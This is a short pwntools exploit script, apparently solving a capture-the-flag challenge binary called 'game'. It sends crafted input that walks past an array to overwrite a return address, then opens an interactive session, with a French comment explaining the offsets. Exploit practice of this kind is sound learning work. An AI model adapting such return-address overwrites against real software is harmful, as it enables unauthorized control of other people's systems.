#!/usr/bin/env python3
from pwn import *

exe = './game'
elf = context.binary = ELF(exe, checksec=False)

payload = b'w' *  5     
payload += b'a' * 43    
# retru naddres se trouve 39 byte deriere array start donc en se rend au debut  de l'array apres en fait encore w pour eviter d'overrite lesp aram en se rend au dessue du return addres en change le nom par une lettre qui cocrespend a un offset de la func main et en re descend pour overwrite


def start():
    if args.REMOTE:
        host = args.HOST or '127.0.0.1'
        port = int(args.PORT or 1337)
        return remote(host, port)
    # PTY ensures line-buffered stdout so flag is visible before crash
    return process(exe, stdin=PTY, stdout=PTY)


io = start()
io.send(payload)
io.send(b"lp")
io.send(b"s")
io.interactive()
